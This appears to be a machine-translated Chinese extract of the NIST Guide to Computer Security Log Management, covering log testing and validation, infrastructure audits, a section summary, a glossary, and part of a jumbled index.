61 有關媒體清理的更多信息，請參閱 NIST SP 800-88，媒體清理指南。它可以在 http://csrc上找到nist.gov/publications/nistpubs/。62 許多管理員將日誌文件放在單獨的分區上。這有助於確保用於日誌的磁盤空間不會被系統上的用戶數據和其他文件意外佔用。此外，通過將日誌放在一個位置，管理員可以更輕鬆地監控可用於日誌的可用空間。5-10 計算機安全日誌管理指南漏洞掃描、滲透測試或常規操作（例如，遠程登錄系統），然後確保這些活動應生成的日誌數據存在，並根據組織的政策和程序進行處理. 大多數測試和驗證工作主要使用被動方法。主動方法通常比被動方法更有效，因為主動方法執行日誌記錄過程的實際測試，但主動方法也更耗費資源。此外，一些主動方法（如滲透測試）可能會無意中破壞系統功能或造成發生嚴重計算機安全事件的假象，因此只有在獲得管理層的適當批准並與運營和安全人員協調後才能使用它們。在某些情況下，活動方法不僅用於測試和驗證日誌記錄，還用於審計其他功能。例如，通過在不通知日誌管理人員和其他參與日常操作的情況下使用主動方法，審計員可以評估組織如何有效地執行事件處理以響應日誌中記錄的可疑活動（審計員的主動方法）。組織應對日誌管理基礎設施本身的安全性進行定期審計，並對日誌生成器進行代表性抽樣。這應該作為風險評估來執行，同時考慮到日誌管理基礎架構每一層的主機所面臨的威脅以及為阻止這些威脅而採取的安全控制措施。具體的安全目標包括以下內容： 基礎設施日誌服務器完全加固，只能執行支持日誌管理的功能 生成日誌的系統得到適當保護（例如，完全修補，禁用不需要的服務） 訪問系統級基礎設施日誌和日誌記錄軟件（在主機和媒體上）受到嚴格限制，日誌和軟件的完整性得到保護和驗證。所有涉及日誌數據的網絡通信都根據需要得到適當保護。組織還應定期審查日誌管理基礎架構的設計，並根據需要實施更改。改變設計的可能原因包括利用日誌管理軟件的改進和增強功能、處理更大量的日誌數據以及解決更強大的安全控制的需求。還應定期審查日誌管理流程和程序，以便日誌管理繼續有效地檢測不斷變化的環境中的最新威脅。5.7 總結 系統級和基礎設施管理員應該遵循標準流程來管理他們負責的日誌。日誌管理的主要操作流程是配置日誌源、執行日誌分析、啟動對已識別事件的響應以及管理長期數據存儲。系統級管理員需要配置日誌源，以便他們以所需的格式和位置捕獲所需的信息，並將信息保留適當的時間段。在規劃日誌配置時，系統級管理員不僅要考慮配置對日誌主機的影響，還要考慮對其他日誌管理基礎結構組件的影響。系統級管理員還需要配置日誌源以執行日誌輪換，最好是在固定時間和達到最大日誌大小時輪換。系統級管理員還需要配置系統，以便在無法自動輪轉的日誌變滿時採取適當的行動。5-11 計算機安全日誌管理指南 系統級和基礎架構管理員還有其他責任，例如確保在不再需要時銷毀舊日誌，以符合組織的日誌記錄、數據保留和媒體清理策略。他們還需要保護系統、存儲和傳輸中日誌的機密性、完整性和可用性。另一項職責是為系統的日誌操作提供持續支持，例如監控日誌狀態、監控日誌輪換和歸檔過程，以及獲取、測試和部署日誌軟件更新。組織需要決定如何在系統級別和基礎架構級別劃分日誌分析職責，然後為管理員提供足夠的支持，以便在整個組織中有效地執行日誌管理。在確定如何劃分分析責任時，組織應關注不同類型條目的相對重要性以及理解每個日誌條目真正含義所必需的上下文。執行分析的關鍵是了解與每個系統相關的典型活動。獲得這種理解的最有效方法是每天查看和分析部分日誌數據。每日日誌條目應包括那些被認為最有可能重要的條目，以及一些尚未完全理解的條目。了解典型的日誌條目也有助於配置日誌條目的自動過濾。為了幫助將注意力集中在最重要的日誌條目上，組織應該考慮根據多種因素的組合為每個日誌條目分配自己的優先級。系統級管理員需要以與基礎設施管理員基本相同的方式對其日誌數據進行分析。系統級管理員通常對未發送到基礎架構的日誌條目以及在沒有僅在系統級可用的上下文的情況下無法理解的條目進行分析。當執行分析的管理員發現重要事件時，他們應該遵循組織的事件響應程序以確保適當地解決它，如果是非事故事件，例如小的操作問題，則執行他們自己的響應。作為響應的一部分，管理員應準備好更改其日誌記錄配置，以防止事件淹沒系統及其日誌，或收集有關事件的其他信息。組織應定期執行測試和驗證活動，以確認在整個組織的基礎架構級別和系統級別都遵循了組織的日誌記錄策略、流程和程序。組織還應定期審查日誌管理基礎架構的設計，並根據需要實施更改。還應定期審查日誌管理流程和程序，以便日誌管理繼續有效地檢測不斷變化的環境中的最新威脅。5-12 計算機安全日誌管理指南 附錄 A - 詞彙表 計算機安全日誌管理指南中使用的選定術語定義如下。聚合：參見“事件聚合”。計算機安全日誌管理：僅對計算機安全日誌數據進行日誌管理。相關性：參見“事件相關性”。事件：系統或網絡中發生的事情。事件聚合：將類似的日誌條目合併為一個條目，其中包含事件發生次數的計數。事件關聯：查找兩個或多個日誌條目之間的關係。事件過濾：從分析、報告中抑制日誌條目，或長期存儲，因為它們的特徵表明它們不太可能包含感興趣的信息。事件減少：從所有日誌條目中刪除不需要的數據字段以創建更小的新日誌。設施：系統日誌消息的消息類型。日誌：組織系統和網絡中發生的事件的記錄。日誌分析：研究日誌條目以識別感興趣的事件或抑制無關緊要事件的日誌條目。日誌存檔：將日誌保留較長時間，通常保存在可移動媒體、存儲區域網絡 (SAN) 或專門的日誌存檔設備或服務器上。日誌清除：從日誌中刪除特定日期和時間之前的所有條目。日誌壓縮：以減少文件所需存儲空間量而不改變其內容含義的方式存儲日誌文件。日誌轉換：以一種格式解析日誌並以另一種格式存儲其條目。日誌條目：日誌中的單個記錄。日誌文件完整性檢查：將日誌文件的當前消息摘要與原始消息摘要進行比較，以確定日誌文件是否已被修改。日誌管理：日誌數據的產生、傳輸、存儲、分析和處置的過程。日誌管理基礎設施：用於生成、傳輸、存儲、分析和處置日誌數據的硬件、軟件、網絡和媒體。日誌規範化：將每個日誌數據字段轉換為特定的數據表示形式並對其進行一致的分類。A-1 計算機安全日誌管理指南日誌解析：從日誌中提取數據，以便解析的值可以用作另一個日誌記錄過程的輸入。日誌保存：保留通常會被丟棄的日誌，因為它們包含特別感興趣的活動記錄。日誌減少：從日誌中刪除不需要的條目以創建更小的新日誌。日誌上報：顯示日誌分析的結果。日誌保留：作為標準操作活動的一部分，定期歸檔日誌。Log Rotation：當第一個日誌文件被認為是完整的時候，關閉一個日誌文件並打開一個新的日誌文件。日誌查看：以人類可讀的格式顯示日誌條目。消息摘要：一種數字簽名，唯一標識數據，具有改變數據中單個位會導致生成完全不同的消息摘要的屬性。正常化：請參見“日誌規範化”。基於規則的事件關聯：通過根據記錄的值（例如時間戳、IP 地址和事件類型）匹配來自單個源或多個源的多個日誌條目來關聯事件。安全信息和事件管理軟件：為各種日誌類型提供集中日誌記錄功能的程序。Syslog：指定通用日誌條目格式和日誌條目傳輸機制的協議。A-2 計算機安全日誌管理指南 附錄 B - 首字母縮略詞 計算機安全日誌管理指南中使用的選定首字母縮略詞定義如下。

計算機安全日誌管理指南 此頁有意留空。C-6 計算機安全日誌管理指南 附錄 D - 索引入侵防禦系統日誌，2-2 A L 聚合。請參閱事件聚合 Aggregator，3-1 日誌，2-1 反惡意軟件日誌，2-2 日誌分析，2-10、3-1、4-2、4-5、5-5 反間諜軟件日誌，2- 2 優先級排序、5-6 防病毒軟件日誌、2-2 報告、5-8 應用程序日誌、2-1、2-4 日誌存檔、3-3、5-4、5-9 審計日誌、2-1 日誌清除, 3-5 審計記錄, 2-4 日誌壓縮, 3-4 認證服務器日誌, 2-2 日誌內容, 2-8 日誌轉換, 3-4 日誌轉換實用程序, 3-11 C 日誌數據量, 2-9收集器，3-1 日誌處理，4-4、5-4、5-9 計算機安全日誌。請參閱日誌條目，2-1 日誌上下文，5-5 日誌文件完整性檢查，3-4 關聯。參見日誌格式，2-9，5-9 事件關聯日誌生成，2-8、3-1、4-4、5-1 日誌管理，2-1 D 挑戰，2-8 職責，4-1 數據保留策略，4-7 環境，4 -8 動機，2-7 E 操作流程，5-1 政策，2-10、4-4、4-7 進入。請參閱日誌條目準備、4-1 事件聚合、3-3 優先級、2-10 事件關聯、3-4、3-10 程序、2-10 事件過濾、3-3 角色和職責、4-1 事件減少、 3-4 標準流程，4-1 事件響應，5-8 支持，2-11 測試和驗證，5-10 F 日誌管理基礎設施，2-10、3-1、3-2 架構，3-1 聯邦金融管理改進法案 (FFMIA)，4-6 設計，4-9、5-11 日誌監控，3-1 2002 年聯邦信息安全管理法案 (FISMA)，2-7 日誌規範化，3-4 日誌解析，3- 3 防火牆日誌，2-3 日誌保存，2、3-3、4-7 日誌保護，2-9 G 日誌縮減，3-4 日誌報告，3-5 Gramm-Leach-Bliley 法案 (GLBA)，2-7 日誌保留，3-3 日誌輪換，3-3、5-3 H 日誌輪換實用程序，3-11 日誌安全，5 -4 1996 年日誌源健康保險流通與責任法案 (HIPAA)，2-7 配置，5-1 日誌存儲，2-8、3-1、4-4、5-2、5-9 日誌傳輸，4 -4 I 記錄可信度，2-7 記錄有用性，2-6 入侵檢測消息交換格式（IDMEF），2-8 記錄查看，3-5 記錄網絡，3-2 入侵檢測系統，3-10 入侵檢測系統日誌, 2-2 D-1 計算機安全日誌管理指南 M 消息摘要，3-4 N 網絡隔離服務器日誌，2-3 規範化。請參閱日誌規範化 O 操作系統日誌，2-1、2-4 帶外，3-2 P 支付卡行業數據安全標準 (PCI DSS)，2-8 R 遠程訪問軟件日誌，2-2 路由器日誌,
